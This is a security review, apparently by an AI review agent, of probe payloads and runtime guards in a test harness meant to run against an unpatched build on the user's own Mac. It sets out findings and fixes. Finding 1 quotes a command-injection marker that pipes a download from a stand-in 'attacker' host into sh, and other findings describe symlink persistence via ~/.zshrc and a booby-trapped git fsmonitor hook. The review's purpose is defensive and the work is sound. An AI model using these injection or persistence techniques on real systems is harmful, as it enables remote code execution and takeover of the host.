# Security review: probe payload safety against the host (Phase 3, increment 2)

- **Date:** 2026-11-04
- **Round:** 3 (probe safety, requested by the user before any unpatched run)
- **Reviewer:** independent `security-review` agent, `cvp-claude-opus-5`
- **Subject:** commit `fd7eee2` — the probe payloads, the runtime guards, the
  payload lint, the guard unit tests, and the harness that installs and arms
  them
- **Verdict as reviewed:** **NO-GO**
- **Status now:** critical and high findings in the guards and payloads fixed in
  `b1c4e0e`; harness-side findings remain open and are listed below. **Still
  no-go until those are closed.**

## Why this review existed

The probe set is validated by running it against an **unpatched** build, where
every probe is expected to succeed. That run happens on the user's own Mac. So
the probe set is, by design, a working exploit chain against the machine it is
validated on. The user's requirement, verbatim: *"of course make sure our vuln
examples are not actively malicious against our host."*

The review was framed as the inverse of a normal one: assume the control is
absent and every probe works, then ask what actually happens to the machine.

## Findings and disposition

| # | Severity | Finding | Disposition |
|---|---|---|---|
| 1 | **Critical** | **Command injection into a real host shell.** `markerCommand()` single-quoted the marker, but `safePath()` never rejected a quote. The marker came from `.seclab/targets` *inside the hostile workspace*, so a marker of `<rundir>/a';curl http://attacker/x\|sh;:'` passed the guard and was typed verbatim into a host shell by `host-terminal-sendsequence`, and passed as the `command` argument to a host MCP tool. Arbitrary execution on the user's Mac. The lint *blessed* it, because any file calling `markerCommand(` was whitelisted wholesale. | **Fixed.** The marker is now derived from the run directory and a fixed basename; workspace and environment inputs are ignored entirely. `safePath()` rejects anything outside `[A-Za-z0-9._/-]`. Regression tests added. |
| 2 | **High** | **Dangling symlink bypass → arbitrary host file creation.** The resolver walked up to the nearest *existing* ancestor, so a symlink whose target did not exist made `realpath` throw, the link was discarded, and the **lexical** path was returned and then followed by the write. The tab shares the run directory, so it could pre-create `PWNED.rpcwrite -> ~/.zshrc` or a LaunchAgents plist and get persistence. The existing test only covered a symlink to an *existing* path. | **Fixed.** Containment is verified on the real parent, the final component is rejected if it is a symlink of any kind, and the *verified* path is returned rather than the lexical one. Dangling-symlink test added. |
| 3 | **High** | **Attacker-chosen confinement root, and a self-satisfiable arming gate.** `runDir` fell back to `targets.rundir` from the hostile workspace, so `rundir=/` disabled containment. Worse, `extension.js` serialised all of `process.env` — including `SECLAB_PROBE_NONCE` — into the workspace, handing the tab both halves of the gate. | **Fixed.** `SECLAB_PROBE_RUNDIR` is required with no fallback; marker and canary derive from it; the env dump is gone (see 4). |
| 4 | **High** | **Unarmed exfiltration of real host data.** The observation block in `extension.js` ran outside the arming gate and wrote the full environment, the clipboard, and **real** `github` / `microsoft` sessions into the attacker-readable workspace. On an unpatched build that is a live token and the user's real environment. The canary scan could not catch it, because a real token is not a seeded canary. | **Fixed.** Gated on arming, env reduced to a five-key allow-list, and the fake provider used. |
| 5 | High | **`probe.sh` run from the extension, and an armed `core.fsmonitor` left on the host.** The extension spawned the workspace's `probe.sh`, which egresses externally and writes an unconstrained marker; on an unpatched build that runs host-side. Separately the harness arms a host git repo with `core.fsmonitor = sh .seclab/probe.sh`, disarmed only in `check` mode after `report()` — so an aborted run leaves a booby-trapped repo that any later `git status` triggers. | **Half fixed.** The spawn is removed from the extension; the Level-A runner already triggers `probe.sh` inside the tab, where it belongs. **The `core.fsmonitor` disarm is harness-side and still open.** |
| 6 | Medium | **Live residue from a fully successful run**, with no teardown: a keychain item (`secret-write-own` used a constant key), a leaked host-side tunnel from `asExternalUri`, an open host terminal, an extra host window (verified: `_remoteCLI.windowOpen []` takes the `_files.newWindow` branch upstream), and a **real browser launch** — `openExternal` constrains the destination, not the handler, so AGENTS.md §8.5 was wrong. | **Partly fixed:** the secret key is now per-run (`seclab-probe-<nonce>`). **Teardown, tunnel, terminal, window and browser-launch handling remain open.** |
| 7 | Medium | **The harness destroys the user's clipboard** (`pbcopy` with no save/restore) — plausibly a password or token, which is the very justification for the `clipboard-read` probe. | **Open**, harness-side. |
| 8 | Medium | **The lint was trivially bypassable**: two hard-coded files, line-by-line matching, and a file-wide `markerCommand` whitelist. | **Fixed.** Scans the whole `test/containment` tree, matches on the joined body after collapsing string concatenation, flags `fromCharCode`/base64, and requires the shell command on the *same line* as the guard call. It immediately caught the `probe.sh` spawn of finding 5. |
| 9 | Low | **Guard divergence**: the module was duplicated by copy into both fixtures, and the tests only loaded one. | **Fixed.** One shared `test/containment/probe-safety.js`, required by both. |

### Verified non-issues

- `_remoteCLI.manageExtensions {list:{}}` really is list-only: `args.list` is
  truthy and takes the `listExtensions` branch before any install or uninstall.
- `webview-egress` disposes its panel.

## Verification after the fixes

`test/containment/probe-safety.test.ts`, 25 assertions, all passing, including
three that directly target findings 1–3:

- *refuses a shell metacharacter in a path*;
- *refuses a dangling symlink as the final component*;
- *unarmed when the run directory comes only from the workspace*;
- plus *marker is derived from the run directory, not from the workspace* and
  *markerCommand cannot be injected through the marker path*.

`rpc-filter/tools/lint.sh` reports 3 files clean against 8 rules, having first
failed on the `probe.sh` spawn.

## Still open before a go

1. Unconditional `core.fsmonitor` disarm, including on abort (finding 5).
2. Teardown: keychain entry, tunnel, terminal, window, markers, sandboxes, and
   the post-run "nothing outside the run directory changed" check (finding 6).
3. Clipboard save and restore (finding 7).
4. Decide what to do about the real browser launch from `openExternal`, since
   the destination is constrained but the handler is not.

Items 1–3 are in harness files the fork-build session owns; they have been
raised with them. The reviewer's fallback recommendation stands until teardown
exists: run the unpatched proof under a dedicated throwaway macOS account
rather than the developer's primary one.
